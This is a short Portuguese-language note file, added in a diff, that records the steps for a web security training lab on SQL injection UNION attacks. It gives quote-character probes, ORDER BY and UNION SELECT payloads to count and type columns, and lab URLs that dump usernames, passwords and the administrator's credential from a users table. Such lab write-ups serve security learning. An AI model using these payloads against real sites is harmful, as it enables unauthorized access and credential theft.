@@ -1,0 +1,46 @@
+\\SQL Injection Union Attack, Determing The numbers of columns returned by the query//
+-------------------------------------------------------------------------------------
+
+Laboratório: https://ac091f471f5f6d7ac086631b008a00c4.web-security-academy.net
+
+
+Testar caracteres:
+    |-> '
+    |-> '#
+    |-> '--
+
+----------------------------------------------------------------
+
+
+Determinar as colunas das tabelas:
+    'ORDER BY 1--
+    'ORDER BY 2--
+    'ORDER BY 3--
+
+----------------------------------------------------------------
+Determinar as colunas do primeiro select
+    'UNION SELECT NULL--
+    'UNION SELECT NULL, NULL--
+    'UNION SELECT NULL, NULL, NULL--
+
+
+
+-------------------------------
+Vamos fazer essas 3 injeções para saber qual é a do tipo texto.
+
+'UNION SELECT 'a', NULL--  |-> Essa é do tipo texto!
+'UNION SELECT NULL, 'a'--  |-> Essa é do tipo texto!
+'UNION SELECT 'a', 'a'--   |-> Ambas as colunas são do tipo texto!
+
+https://ac851f0d1edb06f6c021637500bc0019.web-security-academy.net/filter?category=' UNION SELECT 'a', 'a'--
+
+Pegando o username:
+https://ac851f0d1edb06f6c021637500bc0019.web-security-academy.net/filter?category=' UNION SELECT username, NULL FROM users--
+
+Pegando o password:
+https://ac851f0d1edb06f6c021637500bc0019.web-security-academy.net/filter?category=' UNION SELECT password, NULL FROM users--
+
+Pegando dados do administrador:
+https://ac851f0d1edb06f6c021637500bc0019.web-security-academy.net/filter?category='UNION SELECT username,password FROM users WHERE username='administrator'--
+administrator
+h8qbx302big52aw7cc6u
